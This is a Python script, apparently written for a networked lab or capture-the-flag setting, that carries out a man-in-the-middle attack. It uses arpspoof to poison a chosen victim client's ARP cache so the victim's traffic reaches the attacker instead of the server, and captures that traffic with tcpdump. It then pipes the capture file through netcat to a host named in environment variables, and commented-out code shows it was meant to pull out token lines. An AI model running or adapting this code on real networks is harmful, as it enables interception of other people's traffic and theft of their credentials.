import os
import socket
import subprocess
from sys import stderr
import time
import netifaces

def get_ip_address_service(service_name):
    try:
        # Get the host name to IP resolution
        ip_address = socket.gethostbyname(service_name)
        return ip_address
    except socket.gaierror:
        return f"Failed to get IP address for {service_name}"

def get_ip_address_interface(interface):
    try:
        # Get the addresses associated with the given interface
        addresses = netifaces.ifaddresses(interface)
        # Extract the IP address from the AF_INET family
        ip_address = addresses[netifaces.AF_INET][0]['addr']
        return ip_address
    except (KeyError, IndexError):
        return None

class MITM:

    def __init__(self):
        self.server_addr = get_ip_address_service('server')
        self.hacker_addr = get_ip_address_interface('eth0')
        # self.victim_addr = self.server_addr[:-2] + str(2 ^ 3 ^ 4 ^ \
        #         int(self.server_addr[-1]) ^ int(self.hacker_addr[-1]))
        clients_addr = [get_ip_address_service('client0'), get_ip_address_service('client1')]
        print(f"Server address: {self.server_addr}", file=stderr)
        print(f"My address: {self.hacker_addr}", file=stderr)
        print(f"Clients addresses: {clients_addr}", file=stderr)
        clients_addr.remove(self.hacker_addr)
        self.victim_addr = clients_addr[0] if clients_addr else None
        print(f"Victim addresses: {self.victim_addr}", file=stderr)
        stderr.flush()
        self.arpspoof = subprocess.Popen(["arpspoof", "-t", self.victim_addr, self.server_addr],
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE)
        self.tcpdump = subprocess.Popen(["tcpdump", "-n", "-w", "capture.pcap", "src", "host", self.victim_addr],
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)

    def collect_info(self):
        print("Start transferring", file=stderr)
        print(f"arpspoof:", file=stderr)
        self.arpspoof.kill()
        self.tcpdump.kill()
        print(f"{self.arpspoof.stdout.read()}", file=stderr)
        print(f"{self.arpspoof.stderr.read()}", file=stderr)
        print(f"tcpdump:", file=stderr)
        print(f"{self.tcpdump.stdout.read()}", file=stderr)
        print(f"{self.tcpdump.stderr.read()}", file=stderr)
        stderr.flush()
        target = os.getenv("BASE_ADDR")
        port = os.getenv("BASE_PORT")
        print(f"Filesize: {subprocess.getoutput('du -h capture.pcap')}", file=stderr)
        print("Dumping", file=stderr)
        stderr.flush()
        s = subprocess.getoutput("tcpdump -r capture.pcap -A -n")
        print("Dumped", file=stderr)
        stderr.flush()
        # info = []
        # for line in s.split('\n'):
        #     if 'TOKEN' in line:
        #         info.append(line)
        # with open("tmp.txt", "w") as fp:
            # fp.writelines(info)
            # fp.write(s)
        os.system(f"cat capture.pcap | nc {target} {port}")
        print("Transferred", file=stderr)
        stderr.flush()
        # while True: time.sleep(1)



